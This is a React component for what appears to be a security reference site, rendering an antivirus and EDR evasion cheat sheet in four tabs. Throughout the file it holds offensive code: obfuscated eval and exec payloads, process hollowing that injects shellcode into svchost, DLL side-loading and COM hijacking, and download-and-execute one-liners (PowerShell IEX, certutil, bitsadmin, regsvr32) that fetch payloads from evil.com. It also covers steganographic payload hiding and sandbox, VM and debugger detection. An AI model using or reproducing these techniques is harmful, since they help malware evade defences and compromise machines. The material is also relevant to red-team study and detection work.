
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Eye, Code, AlertTriangle, Cpu } from 'lucide-react';

const AntivirusEvasion: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <Eye className="h-6 w-6" />
          Antivirus & EDR Evasion
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs defaultValue="payload-obfuscation" className="w-full">
          <TabsList className="grid grid-cols-2 md:grid-cols-4 w-full mb-6">
            <TabsTrigger value="payload-obfuscation">Payload Obfuscation</TabsTrigger>
            <TabsTrigger value="edr-bypass">EDR Bypass</TabsTrigger>
            <TabsTrigger value="encoding-techniques">Encoding</TabsTrigger>
            <TabsTrigger value="behavioral-evasion">Behavioral</TabsTrigger>
          </TabsList>

          <TabsContent value="payload-obfuscation" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Payload Obfuscation Techniques</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">JavaScript Obfuscation</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# String Splitting
var a = "ale";
var b = "rt";
eval(a + b + "(1)");

# Character Code Conversion
String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)

# Base64 Encoding
eval(atob("YWxlcnQoMSk="));

# Hex Encoding
eval("\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29");

# Template Literals
eval(\`\${"ale"}\${"rt"}(1)\`);

# Unicode Escape
eval("\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029");`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">PowerShell Obfuscation</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# String Concatenation
$a = "Write"
$b = "-Host"
& ($a + $b) "Hello World"

# Base64 Encoding
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host "Hello"'))
powershell -EncodedCommand $encoded

# Character Substitution
\${"Write-Host".Replace("i","!")} "Hello"

# Variable Obfuscation
\${""}  = "Write-Host"
& \${""} "Hello"

# Tick Marks
W\`rite-H\`ost "Hello"`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Python Obfuscation</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Import Obfuscation
__import__('os').system('id')

# Exec with Encoding
exec('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImxzIik='.decode('base64'))

# Character Manipulation
exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115))

# Lambda Functions
(lambda: __import__('os').system('whoami'))()

# String Formatting
exec("{0}{1}{2}".format("imp", "ort", " os; os.system('id')"))

# ROT13 Encoding
import codecs; exec(codecs.decode('vzcbeg bf; bf.flfgrz("vq")', 'rot13'))`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="edr-bypass" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">EDR Bypass Techniques</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Process Hollowing</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# PowerShell Process Hollowing
$bytes = [System.IO.File]::ReadAllBytes("payload.exe")
$proc = Start-Process "notepad.exe" -WindowStyle Hidden -PassThru
$h = [kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
[kernel32]::WriteProcessMemory($h, $proc.MainModule.BaseAddress, $bytes, $bytes.Length, [ref]0)

# C# Process Hollowing
using System.Diagnostics;
using System.Runtime.InteropServices;

Process target = Process.Start("svchost.exe");
IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
WriteProcessMemory(hProcess, target.MainModule.BaseAddress, shellcode, shellcode.Length, out _);`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">DLL Side-Loading</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Hijacking Legitimate Processes
# Place malicious DLL in application directory
copy malicious.dll "C:\\Program Files\\App\\legitimate.dll"

# Use legitimate signed binaries
regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc");

# COM Hijacking  
reg add "HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32" /ve /d "C:\\path\\to\\malicious.dll"`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Living off the Land</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# PowerShell Download and Execute
powershell -c "IEX((New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'))"

# BitsAdmin
bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/payload.exe C:\\temp\\payload.exe

# CertUtil
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# MSBuild
msbuild.exe payload.xml

# InstallUtil
installutil.exe /logfile= /LogToConsole=false /U payload.exe`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="encoding-techniques" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Advanced Encoding Techniques</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Multi-Layer Encoding</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Triple Base64 Encoding
echo "payload" | base64 | base64 | base64

# XOR Encoding
python -c "
data = b'payload'
key = b'key'
encoded = bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
print(encoded.hex())
"

# Custom Caesar Cipher
def caesar_encrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            ascii_offset = 65 if char.isupper() else 97
            result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
        else:
            result += char
    return result`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Steganography</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Hide payload in image
steghide embed -cf image.jpg -ef payload.txt -sf output.jpg

# PNG Steganography
python -c "
import struct
from PIL import Image

def hide_payload(image_path, payload):
    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    # Convert payload to binary
    binary_payload = ''.join(format(ord(char), '08b') for char in payload)
    
    # Modify LSB of pixels
    for i, bit in enumerate(binary_payload):
        pixel = list(pixels[i])
        pixel[0] = (pixel[0] & 0xFE) | int(bit)
        pixels[i] = tuple(pixel)
    
    img.putdata(pixels)
    img.save('stego_image.png')
"`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="behavioral-evasion" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Behavioral Evasion</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Sandbox Detection</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Time-based Delays
Start-Sleep -Seconds 300  # 5 minute delay

# User Interaction Check
if ((Get-Process | Where-Object {$_.ProcessName -eq "explorer"}).Count -eq 0) { exit }

# Mouse Movement Detection
$pos1 = [System.Windows.Forms.Cursor]::Position
Start-Sleep -Seconds 5
$pos2 = [System.Windows.Forms.Cursor]::Position
if ($pos1 -eq $pos2) { exit }

# System Resource Checks
if ((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB) { exit }
if ((Get-WmiObject -Class Win32_Processor).NumberOfCores -lt 2) { exit }`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Anti-Analysis Techniques</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Debugger Detection
if (IsDebuggerPresent()) { ExitProcess(0); }

# VM Detection
$vm_artifacts = @(
    "VMware Tools",
    "VirtualBox Guest Additions", 
    "Parallels Tools",
    "Xen Tools"
)

foreach ($artifact in $vm_artifacts) {
    if (Get-Service -Name "*$artifact*" -ErrorAction SilentlyContinue) {
        exit
    }
}

# Process Name Obfuscation
$random_name = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$proc = Start-Process -FilePath "payload.exe" -ArgumentList $random_name`}
                </pre>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default AntivirusEvasion;
